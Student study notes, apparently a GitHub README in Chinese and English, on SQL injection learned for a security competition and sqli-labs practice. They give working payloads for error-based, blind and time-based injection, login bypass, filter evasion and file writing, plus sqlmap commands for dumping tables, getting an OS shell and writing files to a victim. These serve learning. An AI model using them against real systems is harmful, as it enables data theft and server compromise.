# SqlInjection

## 前言

我在大二上学期初的时候随缘参加了一个网络安全竞赛，在增长自己知识同时学习的网络安全之SQL注入，学习笔记word文档在硬盘里停留了大概半年之久，于是在2019年4月搬到github上面。

2019.4.16

## SQL注入相关知识

### 学习内容

学习视频是来自Youtube的博主Security Auditor的视频。[传送门](<https://www.youtube.com/watch?v=du-jkS6-sbo&list=PLkiAz1NPnw8qEgzS7cgVMKavvOAdogsro>)

博主网站  [here](http://dumy2dummies.blogspot.com/)

当时笔记使用蹩脚的乡村英语写的(嘤)

### Head

SQL-Injection-Notes

YangZhe

2018.10.6

### Basic injection

```mysql
select table_name from information_schema.tables where table_schema=database() limit 2,1;
select column_name from information_schema.tables where table_name=database() limit 2,1;
```

**1.** **How to know the database name:**

```mysql
select count(*),concat(0x3a,database(),0x3a,floor(rand()*3))a from information_schema.tables group by a;
```

**2.** **How to know the tables name:**

```mysql
select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit n,1),0x3a,floor(rand()*3))a from information_schema.tables group by a;
```

**3.** **How to know the columns nane:**

```mysql
select count(*),concat((select column_name from information_schema.column where table_name=’users’ limit n,1),0x3a,floor(rand()*3))a from information_schema.tables group by a;
```

### double query injection

**What is double query injection?**

```mysql
Select database();  #query
Select (select database()) #double query injection
#example
select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit n,1),0x3a,floor(rand()*3))a from information_schema.tables group by a;
```

tips: “n” is a outstanding variable which can show the n’s data.

**funtions:**

count(*): select count(*) from users;

rand()*n

floor()

**Core mind:**

1. We need to use rand() function to rise the failure so that we can get the failure information in our html surface. Then we can know the database dump for us!
2. Count(*)!!!!

```mysql
index.php?id=3”) and (select 1 from (select count(*),concat(0x3a,database(), 0x3a,floor(rand()*3))a from information_schema.tables group by a)b) --+
```

### Blind Injection

#### Boolean Injection

function `length ()`

select length (database ());

#### time based

` sleep(num)`

```mysql
Select if(condition, if true, if false)===select if((select database())= ”security”, sleep(10),null)
```

**Core mind:**

in this case, you don’t know the true return of database, and it may return the same ending to you. And it may confuse you a lot. So how to distinguish the end? Use the *sleep()* function. If you get a fake information, it will reply you instantly, or it will wait for n seconds to send you a correct answer.



### Dump File

```mysql
outfile – select * from user into outfile "/tmp/test.txt"
# ?id=1’)) union select 1,database(),3 into outfile “.....”
```



### 'Update' key word

It is a very **dangerous** word! It can reset all the data in refer data.!!

```mysql
UPDATE table SET password=’’ or 1=1 # where account =’sss’;
```



### Login example

```mysql
Select col1,col2 from users where account=(”admin”)  and (select database()=”name”) #”) password=(“”); 

# insert demo
‘ or ‘1’=’1
```

In referred sentence, if “admin” exist, try to use “and”, or use “or”!



### Cookie Injection

It may refers to base64 encoding or decoding.



### Second-order-injection(Indirect injection)

Such as sqli-labs-24

He checked the input where we have signed up.

But when we try to change out password, there is a big problem for us. 

If we input ‘account --’, we may have not bypassed the login system, but the system if not examine the input, the reset system may change the ‘account’ ‘s password.



### Key word Filter

or --- ||

and ---urlencode(‘&&’)---%26%26

**Spaces and comments:**

1. Space: replace space with some non-printed character such as %a0/%0b/ ‘(‘ / ’)’

2. Comment 1||1 or 1’||’1……etc

3. If the letter capitalized or not.

**White List**

It is said that it only accepts the integer parameter.

So we need to know a tips that

If we do this:

​       **File.php?id=1&?id=8**

In php:

It will ignore the first parameter and only accepts the last get.

So we can make full use of this to bypass the whitelist filter.

​       In jsp:

​         It always take the first parameter in jsp or java application



If there is an escape character conversion. You’d better to encode as utf-16 or else.

​       \ ----- 5c ---- one byte

​       \ ----- %bf%5c ----- two byte ---- it can bypass the filter if it is not filter by hex.

## SQLMAP的使用

### GET注入

| 检测是否存在SQL漏洞                | ./sqlmap.py   -u "url"                                       |
| ---------------------------------- | ------------------------------------------------------------ |
| 获取数据库(在已知有漏洞的前提之下) | ./sqlmap.py   -u "url" --dbs                                 |
| 获取指定数据库下的表名             | ./sqlmap.py -u "url" -D "库" --tables                        |
| 获取字段（已知数据库+表名）        | ./sqlmap.py -u "url" -D "库" -T"表" --column                 |
| 暴表                               | ./sqlmap.py -u "url" -D "库" -T"表"   --dump                 |
| 获取指定字段下的内容               | ./sqlmap.py -u "url" -D "库" -T"表"   -C"字段" --dump        |
| 只取部分内容(相当于LIMIT M,N)      | ./sqlmap.py -u "url" -D "库" -T"表"   --dump --start 1 --stop 5 |

### level检测级别

命令行：./sqlmap.py -u "url" --level n

高级别可能会添加一些payload或者检测http头来，会更加复杂来绕过防火墙。

比如说level 3 会去检测user-Agent啥的

### POST注入

./sqlmap.py -u "url" --data"POST数据"

暴表，爆库操作同表格

### 添加COOKIE信息

./sqlmap.py -u "url" --cookie"COOKIE数据"

### 请求头注入

./sqlmap.py -u "url" --header"id:5"

### 注入优先级

sqlmap星号优先指定注入

例：**./sqlmap.py -u "localhost://a.php?id=1&group=4&appid=5*&key=1DEF55ADSC"**

在参数appid的值5后面加一个“*”，来让sqlmap来优先注入此值

### 注入方式的选择

为了节约时间，HACKER可能已经知道这个是什么类型的注入漏洞

他可以直接选择相应的注入方式

例：--technique "U"  只选择联合注入

### SQLmap命令执行

#### 系统SHELL获取

./sqlmap.py -u "url" --os-shell   系统交互shell

来获取对方的shell

Custom location：可以通过一些mysql_error等来得到对应的路径

#### 数据包注入（推荐）

利用  -r 参数

直接传入HTTP头，这里面包括get/post ，cookie 等等数据，就不需要什么

-u --cookie --headers等等

简单暴力，方便易行

### SQLMAP其他的常用功能：

1. 代理    ./sqlmap.py -u "url" --proxy"http://127.0.0.1:8080"

2. 多线程   ./sqlmap.py -u "url" --threads 3

3. 指定数据库   ./sqlmap.py -u "url" --dbms "MySQL"

4. 向受害者写入本地文件   ./sqlmap.py -u "url" --file-write "My file"  --file-dest "HIS PATH"
